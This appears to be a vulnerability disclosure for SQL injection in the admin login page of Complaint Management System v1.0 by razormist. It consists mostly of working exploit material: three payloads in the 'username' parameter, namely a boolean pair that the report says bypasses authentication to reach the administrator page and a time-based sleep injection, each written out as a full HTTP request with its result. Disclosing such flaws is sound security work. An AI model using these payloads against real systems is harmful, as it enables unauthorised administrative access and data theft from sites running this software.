# Complaint Management System v1.0 by razormist has SQL injection

BUG_Author: 

vendors:https://www.sourcecodester.com/php/14206/complaint-management-system.html

Vulnerability File: Complaint Management System/admin/index.php

POST parameter 'username' exists SQL injection vulnerability

Payload1: username=a%27+or+666%3D667--+&password=b&submit=

```
POST /Complaint%20Management%20System/admin/index.php HTTP/1.1
Host: localhost
Content-Length: 48
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Complaint%20Management%20System/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=t4seeleacv1a7kkuldnhdqs4v4
Connection: close

username=a%27+or+666%3D667--+&password=b&submit=
```

Invalid username or password

![image](https://github.com/ggforlove/pic/blob/main/in.png)

Payload2:username=a%27+or+666%3D666--+&password=b&submit=

```
POST /Complaint%20Management%20System/admin/index.php HTTP/1.1
Host: localhost
Content-Length: 48
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Complaint%20Management%20System/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=t4seeleacv1a7kkuldnhdqs4v4
Connection: close

username=a%27+or+666%3D666--+&password=b&submit=
```

The administrator page is successfully logged in

![image](https://github.com/ggforlove/pic/blob/main/ad.png)

Payload3:username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit=

```
POST /Complaint%20Management%20System/admin/index.php HTTP/1.1
Host: localhost
Origin: http://localhost
Cookie: PHPSESSID=vsjva5aj42bfl3b3i7s95s8ukr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://localhost/Complaint%20Management%20System/admin/index.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 70

username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit=
```

The server's response time is 20 seconds

![image](https://github.com/ggforlove/pic/blob/main/sleep.png)


